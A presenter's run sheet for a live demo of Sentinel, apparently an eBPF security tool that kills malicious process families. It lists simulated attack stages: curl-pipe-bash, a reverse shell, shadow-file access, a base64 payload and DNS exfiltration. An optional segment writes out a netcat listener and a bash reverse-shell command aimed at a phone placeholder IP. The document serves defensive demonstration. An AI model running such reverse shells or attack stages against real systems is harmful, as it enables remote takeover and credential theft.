# Sentinel Live Demo — Run Sheet

The pitch in 8 minutes. Terminal on the left, dashboard on the right (or dashboard on the projector, terminal on your laptop).

---

## Pre-flight (do this the night before)

On the Arch machine:

```bash
# 1. Dependencies (Arch)
sudo pacman -Sy --needed python python-pip bcc python-bcc clang llvm linux-headers rsync curl git

# 2. Get the project on the machine
rsync -avz --exclude '.venv' --exclude '__pycache__' --exclude 'dist' \
      <this-repo>/ user@arch:/opt/sentinel-src/
#    — or: scp the release tarball and untar it

# 3. Install (creates sentinel user, venv, systemd services)
cd /opt/sentinel-src && sudo ./install.sh

# 4. Confirm both services + first BPF compile
systemctl status sentinel-hub sentinel-agent
#    NOTE: the agent compiles the eBPF program on first start — allow ~30s
journalctl -u sentinel-agent -n 20   # look for "Sentinel agent operational"

# 5. Fire the dashboard full-screen on the projector
firefox http://localhost:5000    # or chromium --start-fullscreen
```

**Sanity test (quiet room, before the audience):** run `sudo /opt/sentinel-src/demo/attack.sh` once. Every stage should land in the dashboard. If a stage doesn't appear, see *Recovery* below.

**Zero the room:** the dashboard starting empty is part of the story. Don't pre-inject demo data. If you did test earlier: restart the hub to clear it — `sudo systemctl restart sentinel-hub` — and delete `/var/lib/sentinel/lineage_db.json` first for a fully clean slate.

---

## The 8 minutes

### Act 1 — Install live (2:00)
Point at a root shell. Show how boring this is:

> "Brand-new server. One tarball, one command."

```bash
sudo ./install.sh
```

> "That created a locked-down service user, a venv, two systemd units, and a hardened config. The hub is already serving the dashboard — same origin, no separate frontend."

Open the dashboard. **It's empty.**

> "No alerts. That's what a clean server looks like. Security tools that show you a screen full of red on install are training you to ignore them."

### Act 2 — The breach (2:30)
Split screen: dashboard left, root shell right. Run:

```bash
sudo /opt/sentinel-src/demo/attack.sh
```

Narrate each stage as you press ENTER:

- **Stage 1 (curl | bash):** *"The single most common attack pattern on the internet — paste this one-liner. Watch the download process die before the payload arrives."* → CRITICAL badge appears.
- **Stage 2 (reverse shell):** *"The classic. Traditional AV needs a signature for your specific reverse-shell binary. We killed it because a shell asked to open a raw TCP connection — ancestry, not appearance."*
- **Stage 3 (shadow):** *"Credential access — killed before the file contents land anywhere."*
- **Stage 4 (base64):** *"Obfuscated payload. Encoding is decoration; lineage doesn't care."*
- **Stage 5 (DNS):** *"Not everything should be killed. This one's an ALERT — analysts triage, the tool doesn't shoot first on low confidence."*

### Act 3 — The kill-switch (2:00)
On the dashboard: click the reverse-shell lineage in the sidebar. Detail panel opens.

> "Here's the family: every process, every event, every MITRE technique — one tree."

Then the punchline — **run Stage 2's attack again from the shell.** It dies instantly.

> "I already blocked that lineage. That block lives in the kernel — every current AND future member of that family dies at exec, before its first instruction. The attacker can't respawn; they'd have to abandon the entire ancestry chain — which means abandoning the exploit path that got them in."

### Act 4 — Close (1:30)
Show `/metrics`:

```bash
curl -s http://127.0.0.1:5000/metrics | head -15
```

> "Prometheus-native, so this drops into the monitoring stack you already run. Self-hosted, air-gap capable, one tarball. Your servers, your control, your data."

Land the line:

> *"Antivirus asks what a program looks like. Sentinel asks who its parents are — and kills the family from inside the kernel before it runs."*

---

## The phone-as-attacker variant (optional, +2 min, high drama)

1. Phone (Termux): `pkg install nmap-ncat` → `nc -lvlp 4444` — **your phone is now the C2**
2. Find the Arch box's IP: `ip -4 addr | grep inet`
3. On the Arch box: `bash -i >& <PHONE_IP>/4444 2>&1`
4. Your phone shows a live root shell from the "victim" — *let the audience see it*
5. Sentinel kills it within seconds — the shell on your phone dies mid-keystroke

> "That shell was connected to a device in this room. It's gone, and any respawn dies too."

---

## Recovery (if something whiffs on stage)

| Symptom | Fix |
|---|---|
| Stage produces no dashboard event | `journalctl -u sentinel-agent -n 30` — agent alive? BPF loaded? |
| Agent loops/crashes on start | First BPF compile is slow — wait 30s; check `clang`/`bcc` installed |
| Rules not matching | `curl -s localhost:5000/api/v1/rules \| jq '.rules \| length'` — should be ~74 |
| Dashboard empty but attacks ran | Hub restarted mid-demo? Events are in-memory; re-run the stage |
| Everything dead | `sudo systemctl restart sentinel-hub sentinel-agent` — full reset in 5s |

**Golden rule:** never apologize mid-demo. If a stage stalls, say *"let's look at why"*, run one journalctl command — debugging live is itself a demo of operational maturity.
